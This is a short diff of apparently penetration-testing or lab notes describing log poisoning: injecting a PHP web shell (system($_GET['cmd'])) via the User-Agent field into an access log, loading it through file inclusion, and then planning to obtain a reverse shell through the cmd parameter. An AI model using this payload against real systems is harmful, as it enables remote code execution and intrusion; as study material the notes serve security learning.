@@ -9,3 +9,6 @@ we are able to log user input in access log in user-agent field.
 we can add php rce in it and try to load file
 <?php echo system($_GET['cmd']); ?>
 
+after this we can try to retrieve reverse shell by running the command by passing the reverse shell command in cmd params.
+
+
